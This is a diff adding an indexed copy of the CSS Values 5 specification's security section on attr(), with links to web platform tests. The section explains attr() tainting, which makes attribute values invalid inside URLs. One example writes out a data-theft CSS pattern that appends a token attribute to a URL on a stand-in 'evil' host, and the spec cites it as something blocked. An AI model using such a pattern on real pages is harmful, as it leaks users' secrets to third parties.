@@ -1,0 +1,74 @@
+# CSS-VALUES-5#attr-security
+
+**Security** (heading)
+
+**SHA**: hash:7df0e6d52900e24c676072c1398b10403261e3a0f92ec146af8e5b038f4ed621
+
+## Content
+
+Tests
+
+*   [attr-security-animation.html](https://wpt.fyi/results/css/css-values/attr-security-animation.html) [(live test)](http://wpt.live/css/css-values/attr-security-animation.html) [(source)](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-security-animation.html)
+*   [attr-security-if.html](https://wpt.fyi/results/css/css-values/attr-security-if.html) [(live test)](http://wpt.live/css/css-values/attr-security-if.html) [(source)](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-security-if.html)
+*   [attr-security-transition.html](https://wpt.fyi/results/css/css-values/attr-security-transition.html) [(live test)](http://wpt.live/css/css-values/attr-security-transition.html) [(source)](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-security-transition.html)
+*   [attr-security.html](https://wpt.fyi/results/css/css-values/attr-security.html) [(live test)](http://wpt.live/css/css-values/attr-security.html) [(source)](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-security.html)
+*   [attr-security-transition-interpolated.html](https://wpt.fyi/results/css/css-values/attr-security-transition-interpolated.html) [(live test)](http://wpt.live/css/css-values/attr-security-transition-interpolated.html) [(source)](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-security-transition-interpolated.html)
+
+An [attr()](CSS-VALUES-5#funcdef-attr) function can reference attributes that were never intended by the page to be used for styling, and might contain sensitive information (for example, a security token used by scripts on the page).
+
+In general, this is fine. It is difficult to use [attr()](CSS-VALUES-5#funcdef-attr) to extract information from a page and send it to a hostile party, in most circumstances. The exception to this is URLs. If a URL can be constructed with the value of an arbitrary attribute, purely from CSS, it can easily send any information stored in attributes to a hostile party, if 3rd-party CSS is allowed at all.
+
+To guard against this, the values produced by an [attr()](CSS-VALUES-5#funcdef-attr) are considered **attr()-tainted**, as are functions that contain an [attr()-tainted](CSS-VALUES-5#attr-taint) value.
+
+The substitution value of an [arbitrary substitution function](CSS-VALUES-5#arbitrary-substitution-function) is [attr()-tainted](CSS-VALUES-5#attr-taint) *as a whole* if any attr()-tainted values were involved in creating that substitution value.
+
+Using an [attr()-tainted](CSS-VALUES-5#attr-taint) value as or in a [\<url>](CSS-VALUES-4#url-value) makes a declaration [invalid at computed-value time](CSS-VALUES-5#invalid-at-computed-value-time).
+
+> **Example:** For example, all of the following are [invalid at computed-value time](CSS-VALUES-5#invalid-at-computed-value-time):
+>
+> *   [background-image: src(attr(foo));](CSS-BACKGROUNDS-3#propdef-background-image) - can’t use it directly.
+>
+> *   [background-image: image(attr(foo))](CSS-BACKGROUNDS-3#propdef-background-image) - can’t use it in other [\<url>](CSS-VALUES-4#url-value)-taking functions.
+>
+> *   [background-image: src(string("http://example.com/evil?token=" attr(foo)))](CSS-BACKGROUNDS-3#propdef-background-image) - can’t "launder" it thru another function.
+>
+> *   --foo: attr(foo); background-image(src(var(--foo))) (assuming that --foo is a [registered custom property](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property) with string syntax) - can’t launder the value thru another property, either.
+>
+> However, using [attr()](CSS-VALUES-5#funcdef-attr) for other purposes is fine, even if the usage is *near* a url:
+>
+> *   [background-image: image("foo.jpg", attr(bgcolor type(\<color>)))](CSS-BACKGROUNDS-3#propdef-background-image) is fine; the [attr()](CSS-VALUES-5#funcdef-attr) is providing a fallback color, and the [\<url>](CSS-VALUES-4#url-value) isn’t [attr()-tainted](CSS-VALUES-5#attr-taint).
+>
+> Using [attr()](CSS-VALUES-5#funcdef-attr) indirectly via a [custom property](CSS-VARIABLES-2#custom-property) causes [attr()-tainting](CSS-VALUES-5#attr-taint) of the whole custom property value:
+>
+> *   --foo: image("foo.jpg", attr(bgcolor type(\<color>))); background-image: var(--foo); is [invalid at computed-value time](CSS-VALUES-5#invalid-at-computed-value-time).
+>
+>     > **Issue:** Investigate partial tainting of custom property values.
+
+> **Note:** Note: Implementing this restriction requires tracking a dirty bit on values constructed from [attr()](CSS-VALUES-5#funcdef-attr) values, since they can be fully resolved into a string via [registered custom properties](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property), so you can’t rely on just examining the value expression. Note that non-string types can even trigger this, via functions like string() that can stringify other types of values: --foo: attr(foo type(\<number>)); background-image: src(string(var(--foo))) needs to be invalid as well.
+
+## Navigation
+
+- Parent: `attr-notation` — Attribute References: the attr() notation
+- Prev: `attr-substitution` — Substitution
+- Children: 1
+  - `attr-taint` — attr()-tainted
+
+## Outgoing refs (7)
+
+`webspec-index refs CSS-VALUES-5#attr-security -d outgoing -l 7`
+
+## Incoming refs (3)
+
+- CSS-VALUES-5#contents
+- CSS-VALUES-5#privacy
+- CSS-VALUES-5#security
+
+### Possible effects
+
+CSS-VALUES-5#attr-security
+
+Partial analysis: additional effects may exist.
+
+No effects detected by this analysis.
+
+Traces and conditions (bounded): `webspec-index effects "CSS-VALUES-5#attr-security" --format markdown`
